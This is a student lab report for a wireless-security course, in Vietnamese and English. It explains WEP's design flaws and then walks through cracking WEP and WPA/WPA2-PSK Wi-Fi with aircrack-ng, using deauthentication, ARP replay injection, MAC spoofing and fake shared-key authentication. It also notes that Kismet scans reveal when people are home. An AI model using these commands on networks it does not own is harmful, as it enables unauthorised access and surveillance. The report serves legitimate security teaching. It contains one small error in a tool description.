# **[REPORT] WIRELESS NETWORK N MOBILE SECURITY - NT330.K21.ANTN**

**Lecturer: PhD. Lê Kim Hùng**
| Họ và tên | MSSV |
| --- | --- |
| Đặng Hồng Quang | 17520944 |
| Nguyễn Xuân Hà | 18520042 |

# A. CƠ SỞ LÝ THUYẾT
## **I. OVERVIEW ABOUT WIRED EQUIVALENT PRIVACY - WEP**
Wired Equivalent Privacy (WEP) là một thuật toán bảo mật cho các mạng không dây IEEE 802.11. Được giới thiệu như một phần của tiêu chuẩn 802.11 ban đầu được phê chuẩn vào năm 1997, mục đích của nó là cung cấp bảo mật dữ liệu tương đương với mạng có dây truyền thống. [1] WEP, có thể recognizable bằng khóa 10 hoặc 26 chữ số thập lục phân (40 hoặc 104 bit).

Năm 2003, Wi-Fi Alliance tuyên bố rằng WEP đã được thay thế bởi Wi-Fi Protected Access (WPA). Vào năm 2004, với việc phê chuẩn tiêu chuẩn 802.11i đầy đủ (tức là WPA2), IEEE đã tuyên bố rằng cả WEP-40 và WEP-104 đều không được chấp nhận. 

WEP là giao thức mã hóa duy nhất có sẵn cho các thiết bị 802.11a và 802.11b được xây dựng trước tiêu chuẩn WPA, có sẵn cho các thiết bị 802.11g. Tuy nhiên, một số thiết bị 802.11b sau đó đã được cung cấp bản cập nhật phần mềm hoặc phần mềm để bật WPA và các thiết bị mới hơn đã tích hợp sẵn.
## **II. ENCRYPTION DETAILS**
Mỗi gói tin gửi đi sẽ được mã hóa bằng một key stream riêng biệt.

![1280px-Wep-crypt-alt.svg.png](https://www.upsieutoc.com/images/2020/07/05/1280px-Wep-crypt-alt.svg.png)

Key stream này được tạo ra bằng cách kết hợp một IV (Initialization vector) 24 bit với password (dùng để đăng nhập vào wifi) 40 bit.

Khi gói tin được mã hóa xong thì trước khi gửi đi, gói tin ấy sẽ được đính kèm IV ở dạng plaintext vào và cuối cùng là gửi đi đến AP.

AP (Access point) khi nhận được gói tin có kèm IV, nó sẽ dùng IV kết hợp với password và tạo ra key stream đồng thời giải mã gói tin ấy ra. Điều này cũng tương tự ở phía client.

Vấn đề ở đây là khi lượng traffic trong wireless tăng lên rất nhiều, tức là số lượng gói tin sẽ tăng lên nhiều dẫn tới việc sử dụng hết các IV. Hay nói cách khác sẽ có rất nhiều gói tin sử dụng chung một IV dẫn tới việc key stream trùng nhau.
## **III. AUTHENTICATION**
Two methods of authentication can be used with WEP: Open System authentication and Shared Key authentication.

In Open System authentication, the WLAN client does not provide its credentials to the Access Point during authentication. Any client can authenticate with the Access Point and then attempt to associate. In effect, no authentication occurs. Subsequently, WEP keys can be used for encrypting data frames. At this point, the client must have the correct keys.

In Shared Key authentication, the WEP key is used for authentication in a four-step challenge-response handshake:
1. The client sends an authentication request to the Access Point.
2. The Access Point replies with a clear-text challenge.
3. The client encrypts the challenge-text using the configured WEP key and sends it back in another authentication request.
4. The Access Point decrypts the response. If this matches the challenge text, the Access Point sends back a positive reply.

After the authentication and association, the pre-shared WEP key is also used for encrypting the data frames using RC4.
## **IV. THE WEAKNESS OF WEP**
Because RC4 is a stream cipher, the same traffic key must never be used twice. The purpose of an IV, which is transmitted as plain text, is to prevent any repetition, but a 24-bit IV is not long enough to ensure this on a busy network. The way the IV was used also opened WEP to a related key attack. For a 24-bit IV, there is a 50% probability the same IV will repeat after 5,000 packets.

In August 2001, Scott Fluhrer, Itsik Mantin, and Adi Shamir published a cryptanalysis of WEP that exploits the way the RC4 ciphers and IV are used in WEP, resulting in a -passive attack that can recover the RC4 key after eavesdropping on the network. Depending on the amount of network traffic, and thus the number of packets available for inspection, a successful key recovery could take as little as one minute. 

If an insufficient number of packets are being sent, there are ways for an attacker to send packets on the network and thereby stimulate reply packets which can then be inspected to find the key. The attack was soon implemented, and automated tools have since been released. It is possible to perform the attack with a personal computer, off-the-shelf hardware and freely available software such as aircrack-ng to crack any WEP key in minutes.
# **B. TRIỂN KHAI TẤN CÔNG**
## **I. COMMVIEW**
### **1. General about Commview**
Commview là một chương trình dùng để bắt (capturing) và phân tích (analyzing) các gói tin cho mạng Internet hoặc mạng LAN.
![19ed9d1d3136df47c.png](https://www.upsieutoc.com/images/2020/06/14/19ed9d1d3136df47c.png)

Hiện thị các thông số về Channel and Amplitude of APs.
![2ac6e4339b2f9a87d.png](https://www.upsieutoc.com/images/2020/06/14/2ac6e4339b2f9a87d.png)

### **2. Cách sử dụng**
Giao diện của chương trình có 5 trang cho phép bạn xem các dữ liệu và thực thi các hành động khác nhau đối với các gói tin đã bắt được.

Để bắt đầu bắt gói tin, chọn card mạng từ danh sách thả xuống trên thanh công cụ Toolbar, và click vào nút Start Capture hoặc chọn menu File ⇒ Start Capture.

Nếu các gói tin nào đi ngang qua card mạng mà bạn đã chọn, CommView sẽ hiển thị các thông tin về các gói tin đó.
#### **a) Nodes**
Show all information, such as: Vendor Name/MAC address, Channel, SSID, Signal, Max rate, Streams, Rate, Byte, Packet, Retry, Fragment,…
![3377ee3298c348c5a.png](https://www.upsieutoc.com/images/2020/06/14/3377ee3298c348c5a.png)
#### **b) Channels**
Show something about statics, general information about each channel:
![4.png](https://www.upsieutoc.com/images/2020/06/14/4.png)

Statistics about packet types and data rates:

![523b7af6be0a09be4.png](https://www.upsieutoc.com/images/2020/06/14/523b7af6be0a09be4.png)
#### **c) Latest IP Connections (IP Statistics)**
Trang này dùng để hiển thị thông tin chi tiết về những kết nối mạng của máy tính của bạn.
* Local IP – hiển thị địa chỉ IP local. : Tùy gói tin inbound / outbound packets.
* Remote IP – giống như Local IP nhưng ngược lại.
* In, Out –Hiển thị số gói tin đã nhận được / gửi đi.
* Direction –Hiển thị hướng đi của gói tin đó.
* Sessions – hiển thị số các phiên (sessions) kết nối TCP/IP thành công.
* Ports – Liệt kê tất cả các port của remote computer dùng các kết nối sử dụng giao thức TCP/IP.
* Hostname – Hiện thị tên của máy tính từ xa (remote computer). Nếu tên máy tính không thể phân giải
được, thì cột này bỏ trống.
* Bytes – hiển thị số các bytes đã được truyền trong phiên làm việc này.

![6.png](https://www.upsieutoc.com/images/2020/06/14/6.png)
#### **d) Packet**
Trang này được sử dụng để liệt kê tất cả các gói tin mạng đã được bắt và hiển thị thông tin chi tiết về các gói tin.
![7.png](https://www.upsieutoc.com/images/2020/06/14/7.png)
Bảng trên cùng (bảng thứ 1) hiển thị các gói tin đã bắt được. Dùng bàng này để chọn các gói tin nào mà bạn muốn hiển thị và phân tích. Khi bạn chọn gói tin bằng cách click chuột vào nó, thì có 2 bảng khác hiển thị các thông tin chi tiết về gói tin mà bạn chọn.
* No – số thứ tự của gói tin.
* Protocol – hiển thị giao thức của gói tin.
* MAC Addresses – hiển thị địa chỉ MAC nguồn và đích, hướng đi của gói tin.
* IP addresses – hiển thị địa chỉ IP nguồn và đích của gói tin, hướng đi của gói tin.
* Ports –hiển thị port nguồn và port đích của gói tin, hướng đi của gói tin. Port có thểhiện thịtheo tên dịch
vụ hay theo giá trị số.
* Time / Delta – hiển thịthời gian tuyệt đối hoặc thời gian delta (delta time). Delta time là sự chênh lệnh
giữa 2 gói tin cuối cùng của thời gian tuyệt đối.
#### **e) Rules**
Trang này cho phép bạn tạo ra các rule để bắt các gói tin. Ví dụ bạn có thể tạo ra rule để bắt những gói tin đi vào mạng của bạn. Có một vài rule mà bạn cần biết.
* Protocols & Direction:Cho phép bạn bỏ qua hay bắt những gói tin dựa trên giao thức của tầng 2 và tầng 3, hướng đi của gói tin.
* MAC addresses Cho phép bạn bỏ qua hay bắt gói tin dựa trên địa chỉ MAC.
* Ports Cho phép bạn bỏ qua hay bắt gói tin dựa trên port của gói tin đó.
* TCP Flags Cho phép bạn bỏ qua hay bắt gói tin dựa trên TCP flags.
* Text Cho phép bạn bắt gói tin dựa trên nội dung.

![8.png](https://www.upsieutoc.com/images/2020/06/14/8.png)

### **3. Thanh công cụ / hỗ trợ**
Ngoài các tính năng kể trên, CommView còn hỗ trợ các tùy chọn khác như IP Alisases, MAC alisases, Package Generator, Reconstruct TCP session
![9.png](https://www.upsieutoc.com/images/2020/06/14/9.png)
## **II. KISMET**
Flow: Open Terminal ⇒ airmon-ng start wlan0

Kismet can detect any nearby devices that use Wi-Fi, whether they are connected or not. This ability lets us scan the nearby area for both APs and client devices, even watch small details about when a device or connection is in use.

With this data, we can tell when people are home, what devices they own & when they are using them.

Devices per channel:
![10.png](https://www.upsieutoc.com/images/2020/06/14/10.png)

General information about all nearby devices use Wi-Fi:
![11.png](https://www.upsieutoc.com/images/2020/06/14/11.png)

Device Details –Device Info:

![12.png](https://www.upsieutoc.com/images/2020/06/14/12.png)

Statistics about Wi-Fi:

![13.png](https://www.upsieutoc.com/images/2020/06/14/13.png)

Packet Graphs:

![14.png](https://www.upsieutoc.com/images/2020/06/14/14.png)

## **III. CRACKING WPA/WPA2-PSK WITH A DICTIONARY ATTACK**
### **1. Introduction**
WPA/WPA2 supports many types of authentication beyond pre-shared keys. aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng shows the network as having the authentication type of PSK, otherwise, don't bother trying to crack it.

The only time you can crack the pre-shared key is if it is a dictionary word or relatively short in length. Conversely, if you want to have an unbreakable wireless network at home, use WPA/WPA2 and a 63 character password composed of random characters including special symbols.

The impact of having to use a brute force approach is substantial. Because it is very compute intensive, a computer can only test 50 to 300 possible keys per second depending on the computer CPU. It can take hours, if not days, to crunch through a large dictionary.

### **2. Assumptions**
First, this solution assumes:

You are using drivers patched for injection. Use the injection test to confirm your card can inject.

You are physically close enough to send and receive access point and wireless client packets. Remember that just because you can receive packets from them does not mean you may will be able to transmit packets to them. The wireless card strength is typically less then the AP strength. So you have to be physically close enough for your transmitted packets to reach and be received by both the AP and the wireless client. You can confirm that you can communicate with the specific AP by following these instructions.

You are using v0.9.1 or above of aircrack-ng. If you use a different version then some of the command options may have to be changed.
Ensure all of the above assumptions are true, otherwise the advice that follows will not work. In the examples below, you will need to change “ath0” to the interface name which is specific to your wireless card.

### **3. Solution**
The objective is to capture the WPA/WPA2 authentication handshake and then use aircrack-ng to crack the pre-shared key.

This can be done either actively or passively. “Actively” means you will accelerate the process by deauthenticating an existing wireless client. “Passively” means you simply wait for a wireless client to authenticate to the WPA/WPA2 network. The advantage of passive is that you don't actually need injection capability and thus the Windows version of aircrack-ng can be used.

Here are the basic steps we will be going through:
* Start the wireless interface in monitor mode on the specific AP channel
* Start airodump-ng on AP channel with filter for bssid to collect authentication handshake
Use aireplay-ng to deauthenticate the wireless client
* Run aircrack-ng to crack the pre-shared key using the authentication handshake
### **4. Used software**
* Aireplay-ng – Most popular Perl-based WEP encryption cracking tool
* Airodump – GrabbingIVs

### **5. Requirement**
* OS: Obviously Kali Linux (at least 2016.2) installed and working.
* A wireless adapter capable of injection/monitor mode. Some computers have network cards capable of this from the factory. If it isn't available you'll have to buy an external one.
* A wordlist to attempt to "crack" the password once it has been captured.

### **6. Details of steps:**
#### **Step 1 - Start the wireless interface in monitor mode**
```
airmon-ng
airmon-ng start wlan0
iwconfig
```
#### **Step 2 - Start airodump-ng to collect authentication handshake**
```
airodump-ng wlan0mon ⇒ Xac dinh channel
iwconfig wlan0mon channel 11 ⇒ Xac dinh 1 client dang ket noi toi AP.
airodump-ng -c 11 --bssid <MAC_AP> -w psk wlan0mon ... ⇒ Then set up 1 client connect AP !!
```
#### **Step 3 - Use aireplay-ng to deauthenticate the wireless client**
```
aireplay-ng -0 1 -a <MAC_AP> -c <Client_AP> ath0`
```
#### **Step 4 -Run aircrack-ng to crack the pre-shared key**
```
aircrack-ng -w password.lst -b <MAC_AP> psk*.cap
```
### **7. Reference**
Demo is available on Youtube:

[![](https://www.upsieutoc.com/images/2020/06/14/image11e433a1ce5fac76.png)](https://youtu.be/lyvsETiD1WM)
## **IV. CRACKING WEP**

Trong báo cáo này, nhóm chúng em sẽ thực hiện demo một cuộc tấn công crack pass wifi được mã hóa WEP. Báo cáo sẽ trình bày quy trình tấn công cũng như chức năng các tool được sử dụng trong từng bước của quy trình tấn công.

### **1. Cấu hình phần cứng/mềm**
**OS:** Kali Linux 2020.2

**Kernel version:** SMP Debian 5.6.14-1kali1 (2020-05-25)

**RAM:** 8Gb

**CPU:** Intel® Core™ i7-9750H Processor

**Wireless Card:** TL-WN722N  V3.
### **2. Tool sử dụng**
```
airodump-ng, aireplay-ng, aircrack-ng, besside-ng
```
### **3. Quy trình tấn công**
**Step 1:** Thiết lập môi trường.

**Step 2:** Scan mạng để xác định các thông số của mục tiêu.

**Step 3:** Theo dõi, bắt các gói tin tới mục tiêu. Gửi các gói tin fake tới mục tiêu để đẩy nhanh quá trình thu nhập data.

**Step 4:** Khi đã thu nhập "đủ" data, dừng theo dõi mục tiêu và bắt đầu crack pass từ những data đã thu nhập.

**Lưu ý:** quy trình trên áp dụng cho tấn công mạng WEP-OpenKey, đối với WEP-ShareKey, chúng ta có thể thực hiện dễ dàng hơn theo quy trình được đề cập cuối report.
### **4. Thiết lập môi trường tấn công**
```
ifconfig && iwconfig
```

Kiểm tra các interface cũng như card mạng vẫn hoạt động.
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

Chuyển wireless card của chúng ta sang chế độ monitor.
### **5. Scan mạng và bắt gói tin: Airodump-ng**

[Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng) được sử dụng để bắt các packet của 802.11 frames. Tool này phù hợp để bắt các WEP [IVs](http://en.wikipedia.org/wiki/Initialization_vector "http://en.wikipedia.org/wiki/Initialization_vector") (Initialization Vector) để sau đó có thể crack pass bằng tool [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng "aircrack-ng"). 
Trong báo cáo này, nhóm sẽ sử dụng Airodump-ng để xác định các thông số của mục tiêu cũng như dùng để bắt các gói tin. Nhóm sẽ xác định Network's bssid, ssid và channel của mục tiêu.
Dùng lệnh:
```
airodump-ng wlan0
```

Hoặc
```
airodump-ng wlan0 --encrypt wep
```

Trong đó **"wlan0"** là interface chúng ta đã chuyển sang monitor mode từ bước trước. Option  **"--encrypt wep"** xác định chúng ta sẽ chỉ scan các mạng được mã hóa bằng WEP.
![Airodump.png](https://www.upsieutoc.com/images/2020/06/16/Airodump.png)

```
airodump-ng --bssid E8:94:F6:3C:2D:D8 --channel 6 --write wepcracking wlan0
```

Tiếp tục, **airodump-ng** sẽ tập trung theo dõi mạng có  bssid = E8:94:F6:3C:2D:D8 (bssid của mục tiêu). Option **" --write < prefix >"** sẽ dump các packet vào file có **< prefix >**.

[![Airodump_capDATA.png](https://www.upsieutoc.com/images/2020/06/16/Airodump_capDATA.png)](https://www.upsieutoc.com/image/fdT180)

Hãy chú ý tới trường **"#Data"**, đây chính là số lượng các gói tin mà chúng ta đã bắt được. Càng nhiều **Data** thì khả năng crack pass càng lớn. Đối với WEP 40bits, nhóm đề xuất bắt tối thiểu 40.000 **#Data**. 

### **6. Fake gói tin, tăng tốc độ thu nhập data: Aireplay-ng** 
[Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) chủ yếu dùng để inject frames, tạo trafic hỗ trợ **aircrack-ng** trong việc crack WEP và WPA-PSK keys. Có rất nhiều option tấn công có thể xem trong document, nhưng ở report này, chúng ta chỉ sử dụng [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection "arp-request_reinjection").

```
aireplay-ng -3 -b E8:94:F6:3C:2D:D8 wlan0
```

Trong đó **"-3"** là option ARP replay attack, **"-b"** là option chọn bssid mục tiêu.
[![ReplayARP.png](https://www.upsieutoc.com/images/2020/06/17/ReplayARP.png)](https://www.upsieutoc.com/image/frJe2r)
Có thể thấy như trên ảnh,  *Aireplay-ng* sẽ liên tục gửi các gói tin ARP, giúp tăng tốc độ thu nhập **data** của airodump-ng.

Trong trường hợp, khi AP lock địa chỉ Mac máy bạn, có thể thử bằng cách
```
aireplay-ng -3 -b < bssid MAC address> -h < source MAC address> wlan0
```

Trong đó, hay thay thế source MAC addr bằng MAC addr của một user đang kết nối với AP đó.
### **7. Crack WEP: Aircrack-ng** 
[Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng) là một tool chuyên dụng để crack 802.11 WEP và WPA/WPA2-PSK key.  Aircrack-ng có thể crack pass một khi đã thu nhập đủ các gói tin được mã hóa (từ Airodump-ng).

Aircrack-ng xác định khóa WEP bằng hai phương thức cơ bản. Phương pháp đầu tiên là PTW (Pyshkin, Tews, Weinmann), phương pháp này được thực hiện trong hai bước. Trong bước đầu, aircrack-ng chỉ sử dụng các gói ARP. Nếu không tìm thấy khóa, thì nó sử dụng tất cả các gói trong các gói tin ta bắt được. Một hạn chế quan trọng là cuộc tấn công PTW hiện chỉ có thể bẻ khóa các khóa WEP 40 và 104 bit. Ưu điểm chính của phương pháp PTW là rất ít gói dữ liệu được yêu cầu để bẻ khóa WEP.

Phương pháp khác, cũ hơn là phương pháp FMS / KoreK. Phương pháp FMS / KoreK kết hợp các cuộc tấn công thống kê khác nhau để khám phá khóa WEP và sử dụng kết hợp với brute force. Nó đòi hỏi nhiều gói hơn PTW, nhưng mặt khác có thể khôi phục cụm mật khẩu khi PTW đôi khi không thành công.
```
aircrack-ng wepcracking-01.cap
```

Đối với bản demo trong report này, ta cần truyền vào file chứa các packet mà ta đã dump được từ Airodump-ng. và tận hưởng thành quả.

[![Crack.png](https://www.upsieutoc.com/images/2020/06/17/Crack.png)](https://www.upsieutoc.com/image/frezeN)

### **8. Đối với các mạng mã hóa WEP - ShareKey**
Đối với **Shared Key Authentication (SKA)**, Client yêu cầu xác thực từ access point(AP), AP sẽ phản hồi lại một challenge. Client phải mã hoá challenge bằng shared key và gửi trở lại. AP sẽ giải mã và kiểm tra challenge ban đầu. Nếu thành công hay thất bại AP đều gửi thông báo trở về client.

Vấn đề bảo mật ở đây, kẻ tấn công có thể nghe lén việc trao đổi giữa client và AP: plain text challenge và challenge đã mã hoá Kẻ tấn công có thể XOR hai nội dung trên để lấy keystream. Keystream này có thể được sử dụng để mã hoá challenge được gửi từ AP. 

**Quy trình crack:**
Đầu tiên ta cũng phải setup môi trường và scan mạng để chuẩn bị tấn công.
Sau đó bắt đầu theo dõi để bắt được các gói tin challenge.
```
airodump-ng wlan0 -c < target's chanel > --bssid <target's bssid> -w keystream
```
[![KeyStreamCreate.md.png](https://www.upsieutoc.com/images/2020/06/17/KeyStreamCreate.md.png)](https://www.upsieutoc.com/image/frF70s)

**Send gói tin deauthen** để bắt các user phải đăng nhập lại để ta có thể bắt được các gói tin challenge. Sau khi người dùng đăng nhập lại, airodump-ng sẽ bắt được gói tin SKA.
```
aireplay-ng --deauth 0 -a <target's bssid> -c  < true user MAC >  wlan0
```
[![Deauthen.png](https://www.upsieutoc.com/images/2020/06/17/Deauthen.png)](https://www.upsieutoc.com/image/frFmc1)
**Setup interface sang chanel của target.**
```
iwconfig wlan0 channel < target's chanel >
```
**Bắt đầu gửi gói tin challenge fake.**
```
aireplay-ng -1 0 -e  < target's essid >  -y keystream-01-E8-94-F6-3C-2D-D8.xor -a <target's bssid> -h < Mac fake > wlan0
```
**Khi thành công chúng ta sẽ có thể truy cập Access Point như bình thường.**

[![FakeSKA.png](https://www.upsieutoc.com/images/2020/06/17/FakeSKA.png)](https://www.upsieutoc.com/image/frF6QO)

---
